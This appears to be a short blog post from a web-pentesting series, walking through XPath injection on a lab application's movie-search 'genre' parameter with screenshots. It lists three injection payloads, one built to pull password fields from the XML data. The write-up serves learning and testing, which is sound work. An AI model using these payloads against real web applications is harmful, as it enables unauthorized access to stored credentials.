---
layout: post
title: XML\XPath Injection (Search)
categories:
  - Web-Pentesting
---

<br>..

![181](https://teckk2.github.io/assets/images/Web%20Pentest/A1/181.png)
![182](https://teckk2.github.io/assets/images/Web%20Pentest/A1/182.png)
<br>We can select the categories of the movie and the web app will the name of the movies but if you look at the URL there is genre=action specified that could be vulnerable to injection let’s check
![183](https://teckk2.github.io/assets/images/Web%20Pentest/A1/183.png)
<br>**Error**
<br>* genre=')]/password | a[contains(a,'
<br>* genre=') or contains(genre, '
<br>* genre=') or not(contains(genre, 'teck') and '1'='2
  
<br>these are the few conditions which we can use, although it is difficult to crack the Xpath field level until we know the detail of xml like this syntax value, genre, password these are xml fields.
  
![184](https://teckk2.github.io/assets/images/Web%20Pentest/A1/184.png)
<br>**genre=')]/password | a[contains(a,'**
![185](https://teckk2.github.io/assets/images/Web%20Pentest/A1/185.png)
<br>**genre=') or contains(genre, '**

<p class="message">
  ~ Hack the World and Stay Noob
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>
